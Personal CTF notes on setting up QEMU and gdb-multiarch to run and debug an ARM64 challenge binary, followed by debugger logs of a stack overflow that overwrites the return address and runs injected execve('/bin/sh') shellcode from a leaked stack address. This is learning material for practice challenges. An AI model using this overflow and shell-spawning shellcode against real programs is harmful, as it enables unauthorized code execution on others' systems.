# Setting up different computer architecture
So i couldn't run the program and here is chatgpts reply:

## claude
The reason you can't run this program is that it's compiled for a different CPU architecture - specifically ARM aarch64 (64-bit ARM), but you're trying to run it on an x86_64 system (standard PC architecture).

This is clear from the `file` command output:
```
program: ELF 64-bit LSB pie executable, ARM aarch64
```

To run this program, you have a few options:

1. Use QEMU to emulate ARM architecture:
```bash
sudo apt-get install qemu-user
qemu-aarch64 ./program
```

2. Use cross-architecture debugging:
```bash
sudo apt-get install qemu-user-static
gdb-multiarch program
```

3. Set up an ARM virtual machine or container

The simplest solution is probably using QEMU. Install it and try running the program through QEMU's emulation.

The "exec format error" you're seeing is your system telling you it can't execute the binary because it's for a different CPU architecture.

## ARM64 system libraries installation
This error occurs because QEMU needs the ARM64 system libraries to run the program. You'll need to install the ARM64 libraries. Here's how to fix it:

```bash
# Install ARM64 libraries and tools
sudo apt-get update
sudo apt-get install libc6-arm64-cross

# The libraries will be installed in /usr/aarch64-linux-gnu/
# You can run the program by specifying the library path:
qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./program
```

If that doesn't work, you might need additional packages:
```bash
sudo apt-get install gcc-aarch64-linux-gnu
sudo apt-get install binutils-aarch64-linux-gnu
```

For debugging, you can use:
```bash
# Install gdb-multiarch if you haven't
sudo apt-get install gdb-multiarch

# Debug with
gdb-multiarch ./program
```

Then in gdb-multiarch:
```
(gdb) set architecture aarch64
(gdb) set sysroot /usr/aarch64-linux-gnu
(gdb) target remote localhost:1234
```


## pwntools script with arm 
You're right, the basic pwntools script won't work directly with an ARM binary on x86. Here's how you can modify it to work with QEMU:

```python
from pwn import *

# Method 1: Using QEMU directly
binary = "./program"
p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary])

# Method 2: If you need to specify more options
context.arch = 'aarch64'  # Set architecture
context.binary = binary   # Set binary
p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary])

# For remote connection (if the challenge is hosted on a server)
# p = remote('host', port)

# Continue with your exploit
p.recvuntil(b'something')  # Make sure to use bytes
# p.sendline(b'input')
# etc...

p.interactive()
```

For debugging with GDB:
```python
from pwn import *

binary = "./program"
context.arch = 'aarch64'
context.terminal = ['terminator', '-e']  # or whatever terminal you use

# For debugging
p = gdb.debug(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary],
              gdbscript='''
              set architecture aarch64
              set sysroot /usr/aarch64-linux-gnu
              b *main
              c
              ''')

# Continue with your exploit
p.interactive()
```

Additional tips:
1. If you need to attach gdb later:
```python
p = process(['qemu-aarch64', '-g', '1234', '-L', '/usr/aarch64-linux-gnu/', binary])
```
Then in another terminal:
```bash
gdb-multiarch ./program
(gdb) set architecture aarch64
(gdb) target remote localhost:1234
```

2. For logging:
```python
context.log_level = 'debug'  # For detailed logging
```



## update 1

ok I have probably sucessfully set up the arm-based architecture on my kali linux, because:
- I am able to run the program 
- I can able to use scripts to run the program 

Here are the steps I figured out and used to setup the aarch64 environment. Reference: chatgpt
1. Use QEMU to emulate ARM architecture `sudo apt-get update` + `sudo apt-get install qemu-user`
2. install arm64 libraries and tools `sudo apt-get install libc6-arm64-cross`
3. able to run the program already: `qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./program`

To setup script to run the program:
```py
from pwn import * 

binary = "./program"
p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary])
s = '''
b * UwU_main
'''
gdb.attach(p, s) # this doesnt work, this goes into debugging qemu
```

## checksec 

pwndbg> checksec
File:     /home/kali/Desktop/CTF/lastyearbackup/UwUOF+++/program
Arch:     aarch64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No


## program output 

```
┌──(kali㉿kali)-[~/Desktop/CTF/lastyearbackup/UwUOF+++]
└─$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./program
Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ

UwU knows that you may feel lose inside the world of UwU ψ(｀∇´)ψ

Therefore, UwU is good enough to let you know UwU is in 0x7f82555ffcd0 （´◔ ₃ ◔`)
Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄
no
Your input is not UwU enough!! _(┐ ◟;ﾟдﾟ)ノ

```
It leaks the address of `UwU[8]`, which is a stack address 
## obfuscation
the program seemed to be obfuscated because the assembly output is really really weird, it does not map to how simple the c source code is.

So, to be ablet o debug it later, deobsucation might be needed

but to be honest, there might be a chance that we don't even need to debug

so why not just move on right now to focus on overflowing


## So it wasn't really obfuscation

it was more like still the arm64 envrionment hasn't been setup correctly, especially for objudmp, pwndbg etc. 



## re-setup
finally I am able to run the binary and, disassemble and debug with pwndbg
```
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
 X0   0x7fa216fffc80 ◂— 0x557755 /* 'UwU' */
*X1   0x7fa216fffc80 ◂— 0x557755 /* 'UwU' */
 X2   0xfbad2887
 X3   1
 X4   0x1fe88628c3280
 X5   0xfbad2887
 X6   0x7fa217bf0014 ◂— 0x8825d5518368735a
 X7   0xd09f0736
 X8   0x40
 X9   0x41c64e6d
 X10  0xfffff4ec
 X11  0x834e0b5f
 X12  0x41a7
 X13  0x7fa216fff970 ◂— 1
 X14  0x20
 X15  0
 X16  0x7fa217abc6b0 ◂— paciasp 
 X17  0x7fa217ab0bc0 ◂— paciasp 
 X18  0x1ad000
 X19  0x7fa216fffe18 —▸ 0x7fa21700016c ◂— './program'
 X20  1
 X21  0x7fa218a30bc8 (__libc_csu_init) ◂— stp x29, x30, [sp, #-0x40]!
 X22  0x7fa218a30b40 (main) ◂— stp x29, x30, [sp, #-0x10]!
 X23  0x7fa216fffe28 —▸ 0x7fa217000176 ◂— 'CHROME_DESKTOP=code.desktop'
 X24  0x7fa218a1fb38 ◂— 0
 X25  0
 X26  0x7fa218a20000 —▸ 0x7fa218a21350 —▸ 0x7fa218a30000 ◂— 0x10102464c457f
 X27  0
 X28  0
 X29  0x7fa216fffc20 —▸ 0x7fa216fffc90 —▸ 0x7fa216fffda0 —▸ 0x7fa216fffdb0 ◂— 0
 SP   0x7fa216fffc20 —▸ 0x7fa216fffc90 —▸ 0x7fa216fffda0 —▸ 0x7fa216fffdb0 ◂— 0
 LR   0x7fa218a30a78 (UwU_main+44) ◂— add x0, sp, #0x60
*PC   0x7fa218a30a80 (UwU_main+52) ◂— adrp x0, #0x7fa218a30000
────────────────────────────────────────────[ DISASM / aarch64 / set emulate on ]────────────────────────────────────────────
   0x7fa218a30a6c <UwU_main+32>    adrp   x0, #0x7fa218a30000     X0 => 0x7fa218a30000 ◂— 0x10102464c457f
   0x7fa218a30a70 <UwU_main+36>    add    x0, x0, #0xca0          X0 => 0x7fa218a30ca0 (0x7fa218a30000 + 0xca0)
   0x7fa218a30a74 <UwU_main+40>    bl     #puts@plt                   <puts@plt>
 
   0x7fa218a30a78 <UwU_main+44>    add    x0, sp, #0x60           X0 => 0x7fa216fffc80 (0x7fa216fffc20 + 0x60)
   0x7fa218a30a7c <UwU_main+48>    mov    x1, x0                  X1 => 0x7fa216fffc80 ◂— 0x557755 /* 'UwU' */
 ► 0x7fa218a30a80 <UwU_main+52>    adrp   x0, #0x7fa218a30000     X0 => 0x7fa218a30000 ◂— 0x10102464c457f
   0x7fa218a30a84 <UwU_main+56>    add    x0, x0, #0xcf0          X0 => 0x7fa218a30cf0 (0x7fa218a30000 + 0xcf0)
   0x7fa218a30a88 <UwU_main+60>    bl     #printf@plt                 <printf@plt>
 
   0x7fa218a30a8c <UwU_main+64>    adrp   x0, #0x7fa218a30000     X0 => 0x7fa218a30000 ◂— 0x10102464c457f
   0x7fa218a30a90 <UwU_main+68>    add    x0, x0, #0xd40
   0x7fa218a30a94 <UwU_main+72>    bl     #puts@plt                   <puts@plt>
──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ x29 sp 0x7fa216fffc20 —▸ 0x7fa216fffc90 —▸ 0x7fa216fffda0 —▸ 0x7fa216fffdb0 ◂— 0
01:0008│        0x7fa216fffc28 —▸ 0x7fa218a30bac (main+108) ◂— adrp x0, #0x7fa218a30000
02:0010│        0x7fa216fffc30 —▸ 0x7fa217bf1470 ◂— 0xfbad2087
03:0018│        0x7fa216fffc38 ◂— 0
04:0020│        0x7fa216fffc40 —▸ 0x7fa216fffc70 —▸ 0x7fa216fffe18 —▸ 0x7fa21700016c ◂— './program'
05:0028│        0x7fa216fffc48 —▸ 0x497fa217af31d8 ◂— 0x497fa217af31d8
06:0030│        0x7fa216fffc50 —▸ 0x7fa216fffe18 —▸ 0x7fa21700016c ◂— './program'
07:0038│        0x7fa216fffc58 ◂— 0x677216fd
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► 0   0x7fa218a30a80 UwU_main+52
   1   0x7fa218a30bac main+108
   2   0x7fa217a6229c None
   3 0x447fa218a30974 None

```


### here is what I did by simply following claude
1. 
```
# Add ARM64 architecture support
sudo dpkg --add-architecture arm64

# Update package lists
sudo apt update

# Install essential ARM64 packages
sudo apt install gcc-aarch64-linux-gnu
sudo apt install binutils-aarch64-linux-gnu
sudo apt install qemu-user
sudo apt install gdb-multiarch
```
2. `sudo apt install qemu-user-static`
3. install arm64 runtime libraries `sudo apt install libc6:arm64`
```py
from pwn import *

# Set the context
context.binary = "./program"
#context.terminal = ['tmux', 'split-window', '-h']  # or ['gnome-terminal', '-e'] depending on your terminal
context.arch = 'aarch64'


p = gdb.debug('./program',
            '''
            b *UwU_main
            continue
            ''')

# Interact with the process
p.interactive()
```
already done lol 



I simpyl copied them to the terminal and run them, for the last one I have probably already setup in my first setup

## to do 0:
get basic understanding into the arch64 assembly
```UwUmain
Dump of assembler code for function UwU_main:
   0x0000000000000a4c <+0>:     stp     x29, x30, [sp, #-112]!
   0x0000000000000a50 <+4>:     mov     x29, sp
   0x0000000000000a54 <+8>:     mov     x0, #0x7755                     // #30549
   0x0000000000000a58 <+12>:    movk    x0, #0x55, lsl #16
   0x0000000000000a5c <+16>:    str     x0, [sp, #96]
   0x0000000000000a60 <+20>:    adrp    x0, 0x0
   0x0000000000000a64 <+24>:    add     x0, x0, #0xc68
   0x0000000000000a68 <+28>:    bl      0x8e0 <puts@plt>
   0x0000000000000a6c <+32>:    adrp    x0, 0x0
   0x0000000000000a70 <+36>:    add     x0, x0, #0xca0
   0x0000000000000a74 <+40>:    bl      0x8e0 <puts@plt>
   0x0000000000000a78 <+44>:    add     x0, sp, #0x60
   0x0000000000000a7c <+48>:    mov     x1, x0
   0x0000000000000a80 <+52>:    adrp    x0, 0x0
   0x0000000000000a84 <+56>:    add     x0, x0, #0xcf0
   0x0000000000000a88 <+60>:    bl      0x920 <printf@plt>
   0x0000000000000a8c <+64>:    adrp    x0, 0x0
   0x0000000000000a90 <+68>:    add     x0, x0, #0xd40
   0x0000000000000a94 <+72>:    bl      0x8e0 <puts@plt>
   0x0000000000000a98 <+76>:    adrp    x0, 0x11000
   0x0000000000000a9c <+80>:    ldr     x0, [x0, #4056]
   0x0000000000000aa0 <+84>:    ldr     x1, [x0]
   0x0000000000000aa4 <+88>:    add     x0, sp, #0x10
   0x0000000000000aa8 <+92>:    mov     x2, x1
   0x0000000000000aac <+96>:    mov     w1, #0x90                       // #144
   0x0000000000000ab0 <+100>:   bl      0x930 <fgets@plt>
   0x0000000000000ab4 <+104>:   add     x2, sp, #0x10
   0x0000000000000ab8 <+108>:   adrp    x0, 0x0
   0x0000000000000abc <+112>:   add     x1, x0, #0xd88
   0x0000000000000ac0 <+116>:   mov     x0, x2
   0x0000000000000ac4 <+120>:   bl      0x910 <strstr@plt>
   0x0000000000000ac8 <+124>:   str     x0, [sp, #104]
   0x0000000000000acc <+128>:   ldr     x0, [sp, #104]
   0x0000000000000ad0 <+132>:   cmp     x0, #0x0
   0x0000000000000ad4 <+136>:   b.eq    0xb20 <UwU_main+212>  // b.none
   0x0000000000000ad8 <+140>:   adrp    x0, 0x0
   0x0000000000000adc <+144>:   add     x1, x0, #0xd90
   0x0000000000000ae0 <+148>:   ldr     x0, [sp, #104]
   0x0000000000000ae4 <+152>:   bl      0x910 <strstr@plt>
   0x0000000000000ae8 <+156>:   cmp     x0, #0x0
   0x0000000000000aec <+160>:   b.eq    0xb20 <UwU_main+212>  // b.none
   0x0000000000000af0 <+164>:   adrp    x0, 0x0
   0x0000000000000af4 <+168>:   add     x0, x0, #0xd98
   0x0000000000000af8 <+172>:   bl      0x8e0 <puts@plt>
   0x0000000000000afc <+176>:   add     x2, sp, #0x60
   0x0000000000000b00 <+180>:   adrp    x0, 0x0
   0x0000000000000b04 <+184>:   add     x1, x0, #0xd88
   0x0000000000000b08 <+188>:   mov     x0, x2
   0x0000000000000b0c <+192>:   bl      0x8f0 <strcmp@plt>
   0x0000000000000b10 <+196>:   cmp     w0, #0x0
   0x0000000000000b14 <+200>:   b.eq    0xb34 <UwU_main+232>  // b.none
   0x0000000000000b18 <+204>:   mov     w0, #0x1                        // #1
   0x0000000000000b1c <+208>:   bl      0x870 <exit@plt>
   0x0000000000000b20 <+212>:   adrp    x0, 0x0
   0x0000000000000b24 <+216>:   add     x0, x0, #0xdc8
   0x0000000000000b28 <+220>:   bl      0x8e0 <puts@plt>
   0x0000000000000b2c <+224>:   mov     w0, #0x1                        // #1
   0x0000000000000b30 <+228>:   bl      0x870 <exit@plt>
   0x0000000000000b34 <+232>:   nop
   0x0000000000000b38 <+236>:   ldp     x29, x30, [sp], #112
   0x0000000000000b3c <+240>:   ret
End of assembler dump.
```

```main 
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000000b40 <+0>:     stp     x29, x30, [sp, #-16]!
   0x0000000000000b44 <+4>:     mov     x29, sp
   0x0000000000000b48 <+8>:     adrp    x0, 0x11000
   0x0000000000000b4c <+12>:    ldr     x0, [x0, #4056]
   0x0000000000000b50 <+16>:    ldr     x0, [x0]
   0x0000000000000b54 <+20>:    mov     x3, #0x0                        // #0
   0x0000000000000b58 <+24>:    mov     w2, #0x2                        // #2
   0x0000000000000b5c <+28>:    mov     x1, #0x0                        // #0
   0x0000000000000b60 <+32>:    bl      0x890 <setvbuf@plt>
   0x0000000000000b64 <+36>:    adrp    x0, 0x11000
   0x0000000000000b68 <+40>:    ldr     x0, [x0, #4048]
   0x0000000000000b6c <+44>:    ldr     x0, [x0]
   0x0000000000000b70 <+48>:    mov     x3, #0x0                        // #0
   0x0000000000000b74 <+52>:    mov     w2, #0x2                        // #2
   0x0000000000000b78 <+56>:    mov     x1, #0x0                        // #0
   0x0000000000000b7c <+60>:    bl      0x890 <setvbuf@plt>
   0x0000000000000b80 <+64>:    adrp    x0, 0x11000
   0x0000000000000b84 <+68>:    ldr     x0, [x0, #4040]
   0x0000000000000b88 <+72>:    ldr     x0, [x0]
   0x0000000000000b8c <+76>:    mov     x3, #0x0                        // #0
   0x0000000000000b90 <+80>:    mov     w2, #0x2                        // #2
   0x0000000000000b94 <+84>:    mov     x1, #0x0                        // #0
   0x0000000000000b98 <+88>:    bl      0x890 <setvbuf@plt>
   0x0000000000000b9c <+92>:    mov     x0, #0x0                        // #0
   0x0000000000000ba0 <+96>:    bl      0x8a0 <time@plt>
   0x0000000000000ba4 <+100>:   bl      0x900 <srand@plt>
   0x0000000000000ba8 <+104>:   bl      0xa4c <UwU_main>
   0x0000000000000bac <+108>:   adrp    x0, 0x0
   0x0000000000000bb0 <+112>:   add     x0, x0, #0xe00
   0x0000000000000bb4 <+116>:   bl      0x8e0 <puts@plt>
   0x0000000000000bb8 <+120>:   mov     w0, #0x0                        // #0
   0x0000000000000bbc <+124>:   ldp     x29, x30, [sp], #16
   0x0000000000000bc0 <+128>:   ret
End of assembler dump.
```

x0-x7: Arguments/return values (like rdi, rsi, rdx, etc. in x86_64)
x29: Frame pointer (like rbp)
x30: Link register/return address (like storing return address on stack in x86_64)
sp: Stack pointer (like rsp)

Common Instructions:

## registers and instructions 

Good questions!

1. `movk x0, #0x55, lsl #16`:
- `movk` means "move 16-bit immediate keeping other bits"
- Together with the previous instruction, it's constructing a 32-bit value:
```arm
mov  x0, #0x7755        // x0 = 0x0000000000007755
movk x0, #0x55, lsl #16 // x0 = 0x0000000000557755
```
- `lsl #16` means shift the immediate left by 16 bits
- This is a common way to build larger constants in ARM64 since immediates are limited to 16 bits

2. `mov w1, #0x90` vs `mov x1`:
- In ARM64:
  - `x` registers are 64-bit (like `rax` in x86_64)
  - `w` registers are 32-bit (like `eax` in x86_64)
- `w1` is the lower 32 bits of `x1`
- Since `0x90` (144) fits in 32 bits, using `w1` is sufficient
- Using `w1` also automatically zeros the upper 32 bits of `x1`

Register relationships:
```
x1 (64-bit):  0000000000000000 00000000000000090
              |________________|__________________|
                  Upper 32         Lower 32 (w1)
```

This is similar to how in x86_64:
- `rax` is 64-bit
- `eax` is lower 32-bit
- `ax` is lower 16-bit
- `al` is lower 8-bit

## function prologue 
Let's break down these two crucial instructions that form the function prologue:

1. `stp x29, x30, [sp, #-112]!`
- `stp` = Store Pair of registers
- `!` = Pre-index operator (update `sp` before the store)
- This instruction does multiple things in order:
  1. First decrements `sp` by 112 bytes (`sp = sp - 112`)
  2. Then stores `x29` (frame pointer) at `[sp]`
  3. Then stores `x30` (return address) at `[sp + 8]`
  
2. `mov x29, sp`
- Sets up the new frame pointer
- After this, `x29` points to the start of this function's stack frame

Visual representation:
```
Before instructions:
Higher addresses
                    +------------------+
sp, x29 ------>    | Old stack frame  |
                    +------------------+
x30 contains return address

After stp instruction:
                    +------------------+
                    | Old stack frame  |
                    +------------------+
sp + 8 ------>     | x30 (ret addr)   |
sp ----------->     | x29 (old fp)     |
                    | Function data    |
                    +------------------+

After mov instruction:
                    +------------------+
                    | Old stack frame  |
                    +------------------+
sp + 8 ------>     | x30 (ret addr)   |
sp, x29 ------>    | x29 (old fp)     |
                    | Function data    |
                    +------------------+
```

This is equivalent to x86_64's:
```nasm
push rbp                ; Save old frame pointer
mov rbp, rsp           ; Set up new frame pointer
sub rsp, 112           ; Allocate stack space
```

The main differences are:
1. ARM64 saves return address in `x30` register (x86_64 puts it on stack)
2. ARM64 can do multiple operations (stack decrement + store) in one instruction
3. ARM64 allocates all stack space in the first instruction rather than a separate sub

The 112 bytes allocated will be used for:
- Local variables (including `UwU[8]` and `buffer[80]`)
- Saved registers
- Alignment padding if needed

## different between arch64 and x86_64 
Here are the key differences between ARM64 and x86_64 function prologues and calling conventions:

1. Return Address Handling:
```nasm
; x86_64: Return address automatically pushed by CALL
call function    ; Pushes return address to stack

; ARM64: Return address stored in x30 (link register)
bl function      ; Stores return address in x30
```

2. Function Prologue:
```nasm
; x86_64
push rbp                ; Save old frame pointer
mov  rbp, rsp          ; Set new frame pointer
sub  rsp, 112          ; Allocate stack space

; ARM64
stp  x29, x30, [sp, #-112]!   ; Save frame pointer & return address + allocate space
mov  x29, sp                   ; Set new frame pointer
```

3. Parameter Passing:
```nasm
; x86_64
rdi  -> 1st argument
rsi  -> 2nd argument
rdx  -> 3rd argument
rcx  -> 4th argument
r8   -> 5th argument
r9   -> 6th argument

; ARM64
x0   -> 1st argument
x1   -> 2nd argument
x2   -> 3rd argument
x3   -> 4th argument
x4   -> 5th argument
x5   -> 6th argument
```

4. Register Preservation:
```
x86_64 Caller-saved:    rax, rcx, rdx, rsi, rdi, r8-r11
x86_64 Callee-saved:    rbx, rbp, rsp, r12-r15

ARM64 Caller-saved:     x0-x18
ARM64 Callee-saved:     x19-x29, x30
```

5. Stack Management:
```nasm
; x86_64: Manual push/pop
push rax
pop  rax

; ARM64: Usually pairs of registers
stp  x0, x1, [sp, #-16]!    ; Store pair and update sp
ldp  x0, x1, [sp], #16      ; Load pair and update sp
```

6. Return Value:
```nasm
; x86_64
rax  -> Return value

; ARM64
x0   -> Return value
```

7. Stack Alignment:
```
x86_64: 16-byte alignment required
ARM64: 16-byte alignment required but handled differently due to pair operations
```

Key Architectural Differences:
1. ARM64 is a RISC architecture (simpler instructions)
2. x86_64 is CISC (more complex instructions)
3. ARM64 uses fixed-width instructions (4 bytes)
4. x86_64 uses variable-width instructions
5. ARM64 generally needs more instructions for complex operations
6. x86_64 often has single instructions for complex operations
7. ARM64 emphasizes register usage more than x86_64

Would you like me to elaborate on any of these points or provide more specific examples?


# first down then up 
Ah, I see the confusion now. You're right - I made a mistake in the first diagram. Let me correct it and show the consistent layout:

```
Higher addresses
old_sp ---> +------------------+
            |                  |
sp+96 ---> | UwU[8]          |  \
            |                  |   \
sp+16 ---> | buffer[80]      |    } 112 bytes total
            |                  |   /
new_sp ---> | x29 (old fp)    |  /  <- sp-112 from old_sp
sp+8 -----> | x30 (ret addr)  |
Lower addresses
```

The key points:
1. Stack grows downward
2. `sp` is decremented by 112 bytes
3. From NEW `sp` position:
   - `x29, x30` are at the bottom (at sp)
   - `buffer` starts at sp+16
   - `UwU` is at sp+96

This matches the memory layout where higher addresses are at the top and:
- `UwU` is at highest address of our frame
- `buffer` is in the middle
- Saved registers at lowest address of our frame

Thank you for catching this inconsistency! The first diagram I showed was incorrect in its ordering.




Yes, exactly! The process goes like this:

1. First moves downward (allocates space):
```
Higher addr
old_sp ---> +------------------+
            |                  |
            |     112 bytes   |
            |                  |
new_sp ---> +------------------+  <- sp-112
Lower addr
```

2. Then fills upward from the new sp:
```
Higher addr
old_sp ---> +------------------+
            |                  |
sp+96 ---> | UwU[8]          |  written last
            |                  |
sp+16 ---> | buffer[80]      |  written second
            |                  |
new_sp ---> | x29, x30        |  written first
Lower addr
```

This is exactly like in x86_64:
```nasm
; First go down
sub rsp, 112        ; Make space by moving sp down

; Then write up
mov [rsp], rbp      ; Save frame pointer at bottom
; ... other writes go upward from rsp
```

The "first down, then write up" pattern is common in both architectures - it's just the way stack frames are built. Great observation on catching this pattern!




## to do 1:
1. get the leaked address first (done)
2. start overflowing maybe 
3. figure out whether it's a ret2libc, shellcode, or both possible

```
pwndbg> stack 100
00:0000│ x29 sp 0x7f70d13ffc20 —▸ 0x7f70d13ffc90 —▸ 0x7f70d13ffda0 —▸ 0x7f70d13ffdb0 ◂— 0
01:0008│        0x7f70d13ffc28 —▸ 0x7f70d2d80bac (main+108) ◂— adrp x0, #0x7f70d2d80000
02:0010│ x0 x2  0x7f70d13ffc30 ◂— 'UwUUwUAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBTwT12345\n'
03:0018│        0x7f70d13ffc38 ◂— 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBTwT12345\n'
... ↓           8 skipped
0c:0060│        0x7f70d13ffc80 ◂— 'TwT12345\n'
0d:0068│        0x7f70d13ffc88 —▸ 0x407f70d1e4000a ◂— 0x407f70d1e4000a
0e:0070│        0x7f70d13ffc90 —▸ 0x7f70d13ffda0 —▸ 0x7f70d13ffdb0 ◂— 0
0f:0078│        0x7f70d13ffc98 —▸ 0x7f70d1e4229c ◂— bl #0x7f70d1e5932c /* '$\\' */
10:0080│        0x7f70d13ffca0 —▸ 0x7f70d13ffd30 ◂— 0
11:0088│        0x7f70d13ffca8 —▸ 0x7f70d2d80b40 (main) ◂— stp x29, x30, [sp, #-0x10]!
12:0090│        0x7f70d13ffcb0 ◂— 0x1d2d70b48
13:0098│        0x7f70d13ffcb8 —▸ 0x7f70d13ffe18 —▸ 0x7f70d140016c ◂— './program'
14:00a0│        0x7f70d13ffcc0 —▸ 0x7f70d13ffe18 —▸ 0x7f70d140016c ◂— './program'
15:00a8│        0x7f70d13ffcc8 ◂— 1
16:00b0│        0x7f70d13ffcd0 —▸ 0x7f70d2d80bc8 (__libc_csu_init) ◂— stp x29, x30, [sp, #-0x40]!
17:00b8│        0x7f70d13ffcd8 —▸ 0x7f70d2d80b40 (main) ◂— stp x29, x30, [sp, #-0x10]!
18:00c0│        0x7f70d13ffce0 —▸ 0x7f70d13ffe28 —▸ 0x7f70d1400176 ◂— 'CHROME_DESKTOP=code.desktop'
19:00c8│        0x7f70d13ffce8 —▸ 0x7f70d2d6fb38 ◂— 0
1a:00d0│        0x7f70d13ffcf0 ◂— 0
1b:00d8│        0x7f70d13ffcf8 —▸ 0x7f70d2d70000 —▸ 0x7f70d2d71350 —▸ 0x7f70d2d80000 ◂— 0x10102464c457f
1c:00e0│        0x7f70d13ffd00 ◂— 0
1d:00e8│        0x7f70d13ffd08 ◂— 0
1e:00f0│        0x7f70d13ffd10 —▸ 0x7f70d13ffda0 —▸ 0x7f70d13ffdb0 ◂— 0
1f:00f8│        0x7f70d13ffd18 ◂— 0xf763a9dab211920a
20:0100│        0x7f70d13ffd20 ◂— 9 /* '\t' */
21:0108│        0x7f70d13ffd28 ◂— 0xf763a9dab2ca4cf2
22:0110│        0x7f70d13ffd30 ◂— 0
```

I am not assuming probably main is the return address and we need to go there?

wait no... it is probably main+108 which is sp+8, but how can our buffer even go there lol l

I still cannot manage to overwrite return addr of UwU_main, but 

```
 X28  0
 X29  0x6161616461616163 ('caaadaaa')
 SP   0x7f571a3ffc40 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaa'
 LR   0x6161616661616165 ('eaaafaaa')
 PC   0x61616661616165
────────────────────────────────────────────[ DISASM / aarch64 / set emulate on ]────────────────────────────────────────────
Invalid address 0x61616661616165
```


this is what main returned, seems like I overflew main?


```
 LR   0x3132333435363738 ('87654321')
*PC   0x7f8529650bc0 (main+128) ◂— ret 
────────────────────────────────────────────[ DISASM / aarch64 / set emulate on ]────────────────────────────────────────────
   0x7f8529650bac <main+108>    adrp   x0, #0x7f8529650000       X0 => 0x7f8529650000 ◂— 0x10102464c457f
   0x7f8529650bb0 <main+112>    add    x0, x0, #0xe00            X0 => 0x7f8529650e00 (0x7f8529650000 + 0xe00)
   0x7f8529650bb4 <main+116>    bl     #puts@plt                   <puts@plt>
 
   0x7f8529650bb8 <main+120>    mov    w0, #0                    W0 => 0
   0x7f8529650bbc <main+124>    ldp    x29, x30, [sp], #0x10
 ► 0x7f8529650bc0 <main+128>    ret                                <0x3132333435363738>

```
yep it seems to be working!


since a stack address is given, we can probably inject shellcode, calculate offset and then go there!


indeed my plan worked! The leaked address + 0x20 would alreadys go to the place where our shellcode starts!

but seems like the shellcode size is always too large

```
 X29  0x4141414141414141 ('AAAAAAAA')
 SP   0x7f7ffc9ffc10 ◂— 0x68732f6e69622f /* '/bin/sh' */
 LR   0x7f7ffc9ffc20 ◂— 0xf2adcd20d28c45e0
 PC   0x7f7ffc9ffc3c ◂— 0xfc9ffd9800000001
────────────────────────────────────────────[ DISASM / aarch64 / set emulate on ]────────────────────────────────────────────
   0x7f7ffc9ffc28    movk   x0, #0x732f, lsl #32
   0x7f7ffc9ffc2c    movk   x0, #0x68, lsl #48
   0x7f7ffc9ffc30    str    x0, [sp, #-0x10]!
   0x7f7ffc9ffc34    mov    x0, sp
   0x7f7ffc9ffc38    mov    x8, #0xdd                X8 => 0xdd
 ► 0x7f7ffc9ffc3c    udf    #1





──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ x0 sp 0x7f7ffc9ffc10 ◂— 0x68732f6e69622f /* '/bin/sh' */
01:0008│       0x7f7ffc9ffc18 —▸ 0x7f7ffc9ffc20 ◂— 0xf2adcd20d28c45e0
02:0010│       0x7f7ffc9ffc20 ◂— 0xf2adcd20d28c45e0
03:0018│       0x7f7ffc9ffc28 ◂— 0xf2e00d00f2ce65e0
04:0020│       0x7f7ffc9ffc30 ◂— 0x910003e0f81f0fe0
05:0028│ pc-4  0x7f7ffc9ffc38 ◂— 0x1d2801ba8
06:0030│       0x7f7ffc9ffc40 —▸ 0x7f7ffc9ffd98 —▸ 0x7f7ffca00106 ◂— './program'
07:0038│       0x7f7ffc9ffc48 ◂— 1
```

svc #0 becomes udf #1 and corrupted



now I am thinking about writing the shellcode at where the 'B's are -0x48



```
─────────────────────────────────[ DISASM / aarch64 / set emulate on ]──────────────────────────────────
   0x7f86b3dffc24    mov    x2, xzr                   X2 => 0
   0x7f86b3dffc28    mov    x1, xzr                   X1 => 0
   0x7f86b3dffc2c    sub    x8, sp, #0x10             X8 => 0x7f86b3dffc10 (0x7f86b3dffc20 - 0x10)
   0x7f86b3dffc30    mov    x0, x8                    X0 => 0x7f86b3dffc10 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x7f86b3dffc34    mov    x8, #0xdd                 X8 => 0xdd
 ► 0x7f86b3dffc38    svc    #0 <SYS_execve>
        path: 0x7f86b3dffc10 ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0
        envp: 0
   0x7f86b3dffc3c    udf    #0xa

───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ sp 0x7f86b3dffc20 ◂— 0xaa1f03e2aa1f03e0
01:0008│    0x7f86b3dffc28 ◂— 0xd10043e8aa1f03e1
02:0010│    0x7f86b3dffc30 ◂— 0xd2801ba8aa0803e0
03:0018│ pc 0x7f86b3dffc38 ◂— 0xad4000001
04:0020│    0x7f86b3dffc40 —▸ 0x7f86b3dffd98 —▸ 0x7f86b3e00106 ◂— './program'
05:0028│    0x7f86b3dffc48 ◂— 1
06:0030│    0x7f86b3dffc50 —▸ 0x7f86c21f0bc8 (__libc_csu_init) ◂— stp x29, x30, [sp, #-0x40]!
07:0038│    0x7f86b3dffc58 —▸ 0x7f86c21f0b40 (main) ◂— stp x29, x30, [sp, #-0x10]!
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0   0x7f86b3dffc38 None
